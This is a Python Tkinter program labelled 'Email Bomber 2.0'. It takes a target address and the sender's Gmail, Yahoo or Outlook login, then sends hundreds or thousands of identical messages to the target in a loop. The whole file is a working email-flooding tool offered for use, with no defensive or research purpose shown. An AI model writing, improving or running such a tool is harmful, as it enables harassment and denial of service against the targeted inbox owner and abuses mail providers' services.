import tkinter as tk
from tkinter import messagebox
import smtplib

class EmailBomberGUI:
    def __init__(self, master):
        self.master = master
        master.title("Email Bomber 2.0")

        # ASCII art banner
        self.ascii_banner = """
             . . .                   #########################################################
              \|/                    # _____           ____                  _               #
            `--+--'                  #| ____|_ __ ___ | __ )  ___  _ __ ___ | |__   ___ _ __ #
              /|\                    #|  _| | '_ ` _ \|  _ \ / _ \| '_ ` _ \| '_ \ / _ \ '__|#
             ' | '                   #| |___| | | | | | |_) | (_) | | | | | | |_) |  __/ |   #
               |                     #|_____|_| |_| |_|____/ \___/|_| |_| |_|_.__/ \___|_|   #
               |                     #########################################################
           ,--'#`--.                                                        Version: 2.0
           |#######|                                                        Author: Omegazyph
        _.-'#######`-._                    
     ,-'###############`-.                 
   ,'#####################`,               
  /#########################\              
 |###########################|             
|#############################|            
|#############################|            
|#############################|            
|#############################|            
 |###########################|             
  \#########################/            
   `.#####################,'               
     `._###############_,'                 
        `--..#####..--'                   
_______________________________________________________________________________________________________________
"""
        self.label_ascii_banner = tk.Label(master, text=self.ascii_banner, justify="left", font=("Courier", 9))
        self.label_ascii_banner.grid(row=0, column=0, columnspan=2)

        self.label_target = tk.Label(master, text="Target Email:")
        self.label_target.grid(row=1, column=0, sticky="w")

        self.entry_target = tk.Entry(master)
        self.entry_target.grid(row=1, column=1)

        self.label_mode = tk.Label(master, text="Bomb Mode 1:(1000), 2:(500), 3:(250), 4:(custom amount)")
        self.label_mode.grid(row=2, column=0, sticky="w")

        self.entry_mode = tk.Entry(master)
        self.entry_mode.grid(row=2, column=1)

        self.label_server = tk.Label(master, text="Email Server (1: Gmail, 2: Yahoo, 3: Outlook):")
        self.label_server.grid(row=3, column=0, sticky="w")

        self.entry_server = tk.Entry(master)
        self.entry_server.grid(row=3, column=1)

        self.label_from = tk.Label(master, text="Sender Email:")
        self.label_from.grid(row=4, column=0, sticky="w")

        self.entry_from = tk.Entry(master)
        self.entry_from.grid(row=4, column=1)

        self.label_password = tk.Label(master, text="Sender Password:")
        self.label_password.grid(row=5, column=0, sticky="w")

        self.entry_password = tk.Entry(master, show="*")
        self.entry_password.grid(row=5, column=1)

        self.label_subject = tk.Label(master, text="Email Subject:")
        self.label_subject.grid(row=6, column=0, sticky="w")

        self.entry_subject = tk.Entry(master)
        self.entry_subject.grid(row=6, column=1)

        self.label_message = tk.Label(master, text="Email Message:")
        self.label_message.grid(row=7, column=0, sticky="w")

        self.entry_message = tk.Text(master, width=30, height=5)
        self.entry_message.grid(row=7, column=1)

        self.submit_button = tk.Button(master, text="Send Emails", command=self.send_emails)
        self.submit_button.grid(row=8, column=0, columnspan=2)

    def send_emails(self):
        target = self.entry_target.get()
        mode = self.entry_mode.get()
        server = self.entry_server.get()
        sender_email = self.entry_from.get()
        sender_password = self.entry_password.get()
        subject = self.entry_subject.get()
        message = self.entry_message.get("1.0", "end-1c")

        try:
            server_address = ""
            if server == "1":
                server_address = "smtp.gmail.com"
            elif server == "2":
                server_address = "smtp.mail.yahoo.com"
            elif server == "3":
                server_address = "smtp-mail.outlook.com"
            else:
                messagebox.showerror("Error", "Invalid server option.")
                return

            smtp_server = smtplib.SMTP(server_address, 587)
            smtp_server.starttls()
            smtp_server.login(sender_email, sender_password)

            amount = 0
            if mode == "1":
                amount = 1000
            elif mode == "2":
                amount = 500
            elif mode == "3":
                amount = 250
            elif mode == "4":
                amount = int(input("Enter custom amount: "))
            else:
                messagebox.showerror("Error", "Invalid bombing mode.")
                return

            for _ in range(amount):
                smtp_server.sendmail(sender_email, target, f"Subject: {subject}\n\n{message}")

            smtp_server.quit()
            messagebox.showinfo("Success", "Emails sent successfully!")
        except Exception as e:
            messagebox.showerror("Error", f"An error occurred: {e}")

def main():
    root = tk.Tk()
    app = EmailBomberGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
